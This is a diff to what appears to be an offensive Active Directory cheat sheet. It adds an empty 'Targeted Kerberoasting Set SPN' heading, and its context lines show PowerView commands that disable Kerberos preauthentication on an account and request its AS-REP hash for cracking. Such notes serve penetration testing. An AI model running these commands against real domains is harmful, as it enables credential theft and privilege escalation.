@@ -26,6 +26,7 @@ Updating....
 - [Privilege Escalation](#privilege-escalation)
   -  [Kerberoast](#kerberoast)
   -  [Targeted Kerberoasting AS REPs](targeted-Kerberoasting-AS-REPs)
+  -  [Targeted Kerberoasting Set SPN](targeted-Kerberoasting-set-spn)
 
 ## Pre-requisites
 ### Using PowerView:
@@ -410,3 +411,5 @@ Set-DomainObject -Identity test01 -XOR @{useraccountcontrol=4194304} -Verbose
 # Request encrypted AS REP
 Get-ASREPHash -UserName VPN1user -Verbose
 ```
+
+### Targeted Kerberoasting Set SPN
